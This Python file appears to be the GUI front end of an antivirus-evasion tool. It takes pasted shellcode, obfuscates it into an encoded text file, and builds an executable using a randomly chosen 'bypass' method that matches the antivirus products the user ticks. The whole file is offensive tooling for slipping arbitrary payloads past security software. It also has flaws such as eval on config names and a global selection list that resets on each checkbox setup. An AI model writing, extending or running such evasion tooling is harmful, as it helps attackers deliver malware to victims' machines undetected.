# -*- coding: UTF-8 -*-
from tkinter import *
import random
from module.bypass.py_loader import *
from module.bypass.config import *
from colorama import init
init(autoreset=True)


def AddCheckButton(tab1, av_name, column):
    global flag
    flag = []

    v1 = IntVar()

    def callCheckbutton1():
        if (v1.get() == 1):
            flag.append(av_name)
        else:
            flag.remove(av_name)

    Checkbutton(
        tab1,
        variable=v1,
        text=av_name,
        command=callCheckbutton1,
        height=1).grid(sticky=W, row=1, column=column)


def enter(tk, tab1):
    global shellcode_enter
    shellcode_enter = tk.Text(tab1, width=90, height=32)
    shellcode_enter.place(x=30, y=35)


def shellcode_encode(shellcode):
    shellcode = shellcode.replace("\\x", ":")
    shellcode_list = list(shellcode)

    with open("./module/bypass/shellcode.txt", "w", encoding="utf-8") as fw:
        for char in shellcode_list:
            if char.isdigit() == True:
                char = str(ord(char))
                fw.write(char+";")
            if char.isdigit() == False:
                char = str(char)
                fw.write(char+";")
    fw.close()


def Get_Shellcode():
    global shellcode
    if flag != []:
        shellcode = shellcode_enter.get("0.0", "end")
        shellcode_encode(shellcode)

def MakeEXE():
    Get_Shellcode()
    bypass_num = 0
    exp_list = []
    if flag == []:
        print("    \033[0;31;40mError! Please choose your option(s)!\033[0m")
    else:
        for way, object in bypass.items():
            if set(object) >= set(flag):
                exp_list.append(way)
                bypass_num = bypass_num + 1
            else:
                result = False
        if bypass_num == 0:
            print("    \033[0;31;40mSorry! Here is no way to do that!\033[0m")

    if exp_list != [] and len(shellcode) >1:
        exploit = random.choice(exp_list)
        exp = eval(exploit)()
        exp.run_script()
    else:
        print("    \033[0;31;40mplease enter your shellcode\033[0m")
